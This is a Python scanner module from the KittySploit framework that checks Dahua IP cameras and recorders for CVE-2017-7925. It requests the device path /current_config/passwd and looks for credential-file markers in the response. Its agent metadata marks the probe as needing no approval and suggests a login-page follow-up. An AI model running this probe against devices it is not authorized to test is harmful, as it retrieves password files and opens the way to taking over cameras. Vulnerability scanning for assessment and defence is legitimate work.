#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Password in Configuration File issue was discovered in Dahua DH-IPC-HDBW23A0RN-ZS, DH-IPC-HDBW13A0SN, DH-IPC."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dahua Security - Configuration File Disclosure Detection',
        'description': 'A Password in Configuration File issue was discovered in Dahua DH-IPC-HDBW23A0RN-ZS, DH-IPC-HDBW13A0SN, DH-IPC-HDW1XXX, DH-IPC-HDW2XXX, DH-IPC-HDW4XXX, DH-IPC-HFW1XXX, DH-IPC-HFW2XXX, DH-IPC-HFW4XXX, DH-SD6CXX, DH-NVR1XXX, DH-HCVR4XXX, DH-HCVR5XXX, DHI-HCVR51A04HE-S3, DHI-HCVR51A08HE-S3, and DHI-HCVR58A32S-S2 devices. The password in configuration file vulnerability was identified, which could lead to a malicious user assuming the identity of a privileged user and gaining access to sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'dahua', 'camera', 'dahuasecurity', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-7925',
            'https://ics-cert.us-cert.gov/advisories/ICSA-17-124-02',
            'http://us.dahuasecurity.com/en/us/Security-Bulletin_030617.php',
        ],
        'cve': 'CVE-2017-7925',
    }

    def run(self):
        r = self.http_request(method="GET", path='/current_config/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('ugm', 'id:name:passwd',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Dahua Security - Configuration File Disclosure detected",
                path='/current_config/passwd',
            )
            return True
        return False

